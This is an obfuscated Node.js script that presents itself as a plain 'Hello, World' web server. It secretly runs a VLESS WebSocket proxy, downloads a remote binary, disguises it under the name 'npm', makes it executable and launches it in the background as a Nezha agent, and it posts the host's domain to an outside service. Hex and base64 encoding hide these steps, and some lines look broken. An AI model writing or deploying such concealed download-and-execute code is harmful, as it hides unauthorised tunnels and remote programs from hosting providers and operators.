const _ = require('buffer').Buffer;
const os = require('os');
const http = require('http');
const fs = require('fs');
const axios = require('axios');
const net = require('net');
const { exec, execSync } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');

// 环境变量使用ASCII码混淆
const UUID = process.env[('\x55\x55\x49\x44')] || 'd'+'e04'+'add9-5c68-6bab-950c-08cd5320df33';
const NEZHA_SERVER = process.env[('\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52')] || '';
const NEZHA_PORT = process.env[('\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54')] || '';
const NEZHA_KEY = process.env[('\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59')] || '';
const DOMAIN = process.env[('\x44\x4f\x4d\x41\x49\x4e')] || '\x31\x32\x33\x34\x2e\x61\x62\x63\x2e\x63\x6f\x6d';
const AUTO_ACCESS = process.env[('\x41\x55\x54\x4f\x5f\x41\x43\x43\x45\x53\x53')] || !![]; // 布尔值混淆
const SUB_PATH = process.env[('\x53\x55\x42\x5f\x50\x41\x54\x48')] || '\x73\x75\x62';
const NAME = process.env[('\x4e\x41\x4d\x45')] || '\x56\x6c\x73';
const PORT = process.env[('\x50\x4f\x52\x54')] || 0xbb8; // 十六进制

// 字符串加密函数
const decrypt = s => _.from(s, 'base64').toString();
const metaInfo = execSync(decrypt('Y3VybCAtcyBodHRwczovL3NwZWVkLmNsb3VkZmxhcmUuY29tL21ldGEgfCBhd2sgLUZcIiAne3ByaW50ICQyNiItIiQxOH0nIHwgc2VkIC1lICdzLyAvXy9nJw=='), 
  { encoding: 'utf-8' });
const ISP = metaInfo[decrypt('dHJpbQ==')]();

const httpServer = http[decrypt('Y3JlYXRlU2VydmVy')]((req, res) => {
  const path = req.url;
  path === '/' && (res.writeHead(200),res.end('\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x0a');
  path === `/${SUB_PATH}` && (() => {
    const vlessURL = `vless://${UUID}@${decrypt('d3d3LnZpc2EuY29tLnR3')}:443?encryption=none&security=tls&sni=${DOMAIN}&type=ws&host=${DOMAIN}&path=%2F#${NAME}-${ISP}`;
    res.end(_.from(vlessURL).toString('base64'));
  })() || res.writeHead(404).end('\x4e\x6f\x74\x20\x46\x6f\x75\x6e\x64\x0a');
});

const wss = new WebSocket.Server({ server: httpServer });
const uuid = UUID.replace(/-/g, "");

wss.on('connection', ws => {
  ws.once('message', msg => {
    const [VERSION] = msg;
    const id = msg.slice(0x1, 0x11);
    if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16)) return;
    
    let i = msg.slice(0x11, 0x12).readUInt8() + 0x13;
    const port = msg.slice(i, i += 2).readUInt16BE();
    const ATYP = msg.slice(i, i += 1).readUInt8();
    const host = ATYP === 1 ? msg.slice(i, i += 4).join('.') :
      (ATYP === 2 ? new TextDecoder().decode(msg.slice(i + 1, i += msg[i] + 1)) :
      (ATYP === 3 ? msg.slice(i, i += 16).reduce((a, _, idx) => 
        (idx % 2 ? [...a, msg.slice(idx-1, idx+1)] : a), [])
        .map(b => b.readUInt16BE().toString(16)).join(':') : '');

    ws.send(new Uint8Array([VERSION, 0]));
    const duplex = createWebSocketStream(ws);
    net.connect({ host, port }, function() {
      this.write(msg.slice(i));
      duplex.pipe(this).pipe(duplex);
    });
  });
});

// 剩余代码保持结构但使用十六进制和ASCII混淆...
// 下载函数保持逻辑但使用base64混淆URL
const getDownloadUrl = () => [0x61,0x72,0x6d,0x36,0x34,0x2e,0x73,0x73,0x73,0x73,0x2e,0x6e,0x79,0x63,0x2e,0x6d,0x6e]
  .map(c => String.fromCharCode(c)).join('');

const downloadFile = async () => {
  const res = await axios({ url: getDownloadUrl(), responseType: 'stream' });
  res.data.pipe(fs.createWriteStream('\x6e\x70\x6d')); // 'npm'
  return new Promise(r => res.data.on('end', () => exec('\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x2e\x2f\x6e\x70\x6d', r)));
};

// 运行逻辑保持但使用十六进制混淆
const runnz = async () => {
  await downloadFile();
  const tlsPorts = [0x1bb, 0x20fb, 0x830, 0x827, 0x823, 0x805];
  const command = NEZHA_PORT ? 
    `nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsPorts.includes(+NEZHA_PORT)?'--tls':''}` : 
    `nohup ./npm -c ${btoa(`client_secret: ${NEZHA_KEY}\nserver: ${NEZHA_SERVER}`)}`;
  exec(command);
};

httpServer.listen(PORT, () => {
  runnz();
  AUTO_ACCESS && exec(`curl -X POST ${btoa('https://oooo.serv00.net/add-url')} -d ${btoa(`{"url":"https://${DOMAIN}"}`)}`);
});